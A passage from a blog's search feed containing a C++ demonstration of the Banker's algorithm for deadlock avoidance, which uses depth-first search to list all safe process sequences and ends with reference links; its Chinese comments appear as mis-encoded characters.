class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span><span class="comment">//æä¾›vector</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span><span class="comment">//æä¾›memsetå‡½æ•°</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span><span class="comment">//æä¾›fflushå‡½æ•°</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdlib&gt;</span><span class="comment">//æä¾›exitå‡½æ•°</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">status</span> &#123;Safe, UnSafe&#125;;<span class="comment">//å®‰å…¨æ€§æ£€æŸ¥çš„ç»“æœ</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MaxNumber = <span class="number">100</span>;<span class="comment">//è¿›ç¨‹æ•°é‡çš„æœ€å¤§å€¼</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> Available[MaxNumber];<span class="comment">//æ¯ç§èµ„æºçš„å¯ç”¨æ•°é‡</span></span><br><span class="line"><span class="type">int</span> Max[MaxNumber][MaxNumber];<span class="comment">//n*mçš„çŸ©é˜µ,è¡¨ç¤ºæ¯ä¸ªè¿›ç¨‹æ‰€éœ€çš„æœ€å¤§èµ„æºé‡</span></span><br><span class="line">string name[MaxNumber];<span class="comment">//nä¸ªè¿›ç¨‹çš„è¿›ç¨‹å</span></span><br><span class="line"><span class="type">int</span> Allocation[MaxNumber][MaxNumber];<span class="comment">//n*mçš„çŸ©é˜µ,è¡¨ç¤ºæ¯ä¸ªè¿›ç¨‹æ¯ç§èµ„æºå·²ç»åˆ†é…çš„é‡</span></span><br><span class="line"><span class="type">int</span> Need[MaxNumber][MaxNumber];<span class="comment">//n*mçš„çŸ©é˜µ,è¡¨ç¤ºæ¯ä¸ªè¿›ç¨‹è¿˜éœ€çš„æ¯ç§èµ„æºé‡</span></span><br><span class="line"><span class="type">int</span> Request[MaxNumber];<span class="comment">//æ‰€è¯·æ±‚çš„æ¯ç§èµ„æºçš„èµ„æºé‡</span></span><br><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt; &gt; SafeOrder;<span class="comment">//å­˜å‚¨æ‰€æœ‰çš„å®‰å…¨åºåˆ—</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; temp;<span class="comment">//å­˜å‚¨ä¸€ä¸ªä¸´æ—¶å®‰å…¨åºåˆ—</span></span><br><span class="line"><span class="type">int</span> n, m;<span class="comment">//è¿›ç¨‹æ•°ï¼Œèµ„æºç§ç±»æ•°</span></span><br><span class="line"></span><br><span class="line">status sta = UnSafe;<span class="comment">//å®‰å…¨æ€§æ£€æŸ¥çš„ç»“æœ</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//å‡½æ•°å£°æ˜</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">input</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">show</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> Request[])</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">recovery</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> Request[])</span></span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check_bank</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> Request[])</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">check_safe</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> Request[])</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">request</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">choose</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Dfs</span><span class="params">(<span class="type">int</span> i,<span class="type">int</span> Wordk[],<span class="type">bool</span> Finished[])</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">menu</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å‡½æ•°å®ç°</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">input</span><span class="params">()</span><span class="comment">//è¯»å…¥æ•°æ®</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;è¯·è¾“å…¥ç³»ç»Ÿèµ„æºçš„ç§ç±»æ•°:&quot;</span>;</span><br><span class="line">    cin &gt;&gt; m;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;è¯·ä¾æ¬¡è¾“å…¥&quot;</span> &lt;&lt; m &lt;&lt; <span class="string">&quot;ç§ç³»ç»Ÿèµ„æºçš„åç§°ä¸æ•°é‡:&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">        cin &gt;&gt; name[i] &gt;&gt; Available[i];</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;è¯·è¾“å…¥è¿›ç¨‹çš„æ•°é‡:&quot;</span>;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;è¯·è¾“å…¥å„ä¸ªè¿›ç¨‹çš„æœ€å¤§éœ€æ±‚é‡&lt;&quot;</span> &lt;&lt; n &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; m &lt;&lt; <span class="string">&quot;çŸ©é˜µ&gt;[MAX]&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">            cin &gt;&gt; Max[i][j];</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;è¯·è¾“å…¥å„è¿›ç¨‹å·²ç”³è¯·çš„èµ„é‡&lt;&quot;</span> &lt;&lt; n &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; m &lt;&lt; <span class="string">&quot;çŸ©é˜µ&gt;[Allocation]&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">            cin &gt;&gt; Allocation[i][j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span><span class="comment">//è®¡ç®—Need</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            Need[i][j] = Max[i][j] - Allocation[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">show</span><span class="params">()</span><span class="comment">//æ˜¾ç¤ºèµ„æºä½¿ç”¨æƒ…å†µ</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot; Max\tAllocation\tNeed\tAvaliable&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(j==<span class="number">3</span>)</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; name[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">            <span class="keyword">if</span>(j == <span class="number">1</span>)</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;  &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; Max[i][j] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; Allocation[i][j] &lt;&lt; <span class="string">&quot;   &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; Need[i][j] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;\t &quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; Available[j] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> Request[])</span> <span class="comment">//æ›´æ–°æ•°æ®</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        Available[j] -= Request[j];</span><br><span class="line">        Allocation[i][j] += Request[j];</span><br><span class="line">        Need[i][j] -= Request[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">recovery</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> Request[])</span><span class="comment">//è¿˜åŸæ•°æ®</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        Available[j] += Request[j];</span><br><span class="line">        Allocation[i][j] -= Request[j];</span><br><span class="line">        Need[i][j] += Request[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check_bank</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> Request[])</span> <span class="comment">//æŒ‰ç…§é“¶è¡Œå®¶ç®—æ³•æ£€æŸ¥èµ„æºè¯·æ±‚</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(Request[j] &gt; Need[i][j] || Request[j] &gt; Available[j])</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">update</span>(i, Request);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Dfs</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> Work[], <span class="type">bool</span> Finished[])</span><span class="comment">//æ·±åº¦ä¼˜å…ˆæœç´¢,æ‰¾åˆ°æ‰€æœ‰çš„å®‰å…¨åºåˆ—</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i == n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(Finished[j] == <span class="literal">false</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sta = Safe;</span><br><span class="line">        SafeOrder.<span class="built_in">push_back</span>(temp);</span><br><span class="line">        <span class="comment">//temp.clear();</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(Finished[j] == <span class="literal">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">bool</span> t = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; m; k++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(Need[j][k] &gt; Work[k])</span><br><span class="line">                &#123;</span><br><span class="line">                    t = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(t == <span class="literal">true</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; m; k++)</span><br><span class="line">                    Work[k] += Allocation[j][k];</span><br><span class="line">                Finished[j] = <span class="literal">true</span>;</span><br><span class="line">                temp.<span class="built_in">push_back</span>(j);</span><br><span class="line">                <span class="built_in">Dfs</span>(i + <span class="number">1</span>, Work, Finished);</span><br><span class="line">                temp.<span class="built_in">pop_back</span>();       <span class="comment">//å›æº¯,å°†ç¬¬iä¸ªè¿›ç¨‹æ‰€åšçš„æ”¹å˜æ¢å¤</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; m; k++)</span><br><span class="line">                &#123;</span><br><span class="line">                    Work[k] -= Allocation[j][k];</span><br><span class="line">                &#125;</span><br><span class="line">                Finished[j] = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">check_safe</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> Request[])</span> <span class="comment">//æ£€æŸ¥ç³»ç»Ÿå®‰å…¨æ€§</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> Work[MaxNumber];</span><br><span class="line">    <span class="type">bool</span> Finished[MaxNumber];</span><br><span class="line">    <span class="built_in">memset</span>(Finished, <span class="literal">false</span>, <span class="built_in">sizeof</span>(Finished));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">        Work[i] = Available[i];</span><br><span class="line">    sta = UnSafe;</span><br><span class="line">    <span class="built_in">Dfs</span>(<span class="number">0</span>, Work, Finished);</span><br><span class="line">    <span class="keyword">if</span>(sta==UnSafe)</span><br><span class="line">        <span class="built_in">recovery</span>(i, Request);<span class="comment">//è¿˜åŸæ•°æ®</span></span><br><span class="line">    <span class="keyword">return</span> sta;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">request</span><span class="params">()</span><span class="comment">//æŸä¸ªè¿›ç¨‹ç”³è¯·èµ„æº</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="built_in">memset</span>(Request, <span class="number">0</span>, <span class="built_in">sizeof</span>(Request));</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;è¯·è¾“å…¥è¦è¯·æ±‚åˆ†é…èµ„æºçš„è¿›ç¨‹å·&lt;0~&quot;</span> &lt;&lt; n &lt;&lt; <span class="string">&quot;&gt;:&quot;</span>;</span><br><span class="line">    cin &gt;&gt; i;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;è¯·è¾“å…¥è¿›ç¨‹&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;ç”³è¯·çš„èµ„æºæ•°ç›®&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; name[j] &lt;&lt; <span class="string">&quot;:&quot;</span>;</span><br><span class="line">        cin &gt;&gt; Request[j];</span><br><span class="line">    &#125;</span><br><span class="line">    SafeOrder.<span class="built_in">clear</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">check_bank</span>(i, Request) == <span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">check_safe</span>(i, Request) == Safe)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;ç³»ç»Ÿæ˜¯å®‰å…¨çš„!&quot;</span> &lt;&lt; endl;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;å®‰å…¨åºåˆ—æœ‰:&quot;</span>&lt;&lt;SafeOrder.<span class="built_in">size</span>()&lt;&lt;<span class="string">&quot;ç§&quot;</span>&lt;&lt;endl;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; SafeOrder.<span class="built_in">size</span>(); j++)<span class="comment">//è¾“å‡ºæ‰€æœ‰çš„å®‰å…¨åºåˆ—</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; SafeOrder[j].<span class="built_in">size</span>(); k++)</span><br><span class="line">                &#123;</span><br><span class="line">                    cout &lt;&lt; <span class="string">&quot;P&quot;</span> &lt;&lt; SafeOrder[j][k];</span><br><span class="line">                    <span class="keyword">if</span>(k != SafeOrder[j].<span class="built_in">size</span>() - <span class="number">1</span>)</span><br><span class="line">                        cout &lt;&lt; <span class="string">&quot;-&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(SafeOrder[j].<span class="built_in">size</span>()!=<span class="number">0</span>)</span><br><span class="line">                cout &lt;&lt; endl;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;ç³»ç»Ÿä¸å®‰å…¨,æ¢å¤åŸæ¥çŠ¶æ€!&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;èµ„æºè¯·æ±‚ä¸åˆç†!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">choose</span><span class="params">()</span><span class="comment">//é€‰æ‹©èœå•</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> i = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fflush</span>(stdin);</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;è¯·é€‰æ‹©ä½ è¦è¿›è¡Œçš„æ“ä½œ&quot;</span> &lt;&lt; endl;</span><br><span class="line">        cin &gt;&gt; i;</span><br><span class="line">        <span class="keyword">switch</span>(i)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">            <span class="built_in">request</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            <span class="built_in">show</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;è¾“å…¥æœ‰è¯¯,è¯·é‡æ–°è¾“å…¥&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">menu</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">menu</span><span class="params">()</span><span class="comment">//æ˜¾ç¤ºèœå•</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;****************é“¶è¡Œå®¶ç®—æ³•æ¼”ç¤º***************&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;\t\t1:æ˜¾ç¤ºå„ä¸ªçŸ©é˜µçš„å†…å®¹&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;\t\t2:è¿›ç¨‹è¯·æ±‚ç³»ç»Ÿåˆ†é…èµ„æº&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;\t\t0:é€€å‡ºç¨‹åº&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;*********************************************&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;in.txt&quot;, &quot;r&quot;, stdin);</span></span><br><span class="line">    <span class="comment">//freopen(&quot;out.txt&quot;, &quot;w&quot;, stdout);</span></span><br><span class="line">    <span class="built_in">input</span>();</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="built_in">menu</span>();</span><br><span class="line">    <span class="built_in">choose</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p><a href="https://blog.csdn.net/qq_27008079/article/details/53946253">é“¶è¡Œå®¶ç®—æ³•å®ç°â€”â€”æ‰¾å‡ºæ‰€æœ‰å®‰å…¨åºåˆ—</a><br><a href="https://baike.baidu.com/item/%E9%93%B6%E8%A1%8C%E5%AE%B6%E7%AE%97%E6%B3%95/1679781?fr=aladdin">ç™¾åº¦ç™¾ç§‘_é“¶è¡Œå®¶ç®—æ³•</a><br><a href="https://baike.baidu.com/item/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%EF%BC%88%E7%AC%AC%E5%9B%9B%E7%89%88%EF%BC%89/19925494">ã€Šè®¡ç®—æœºæ“ä½œç³»ç»Ÿï¼ˆç¬¬å››ç‰ˆï¼‰ã€‹</a>ï¼Œæ±¤å°ä¸¹ï¼Œè¥¿å®‰ç”µå­ç§‘æŠ€å¤§å­¦å‡ºç‰ˆç¤¾ï¼Œ2014.5</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>æ“ä½œç³»ç»Ÿ</category>
      </categories>
      <tags>
        <tag>DFS</tag>
        <tag>æ“ä½œç³»ç»Ÿ</tag>
      </tags>
  </entry>
</search>
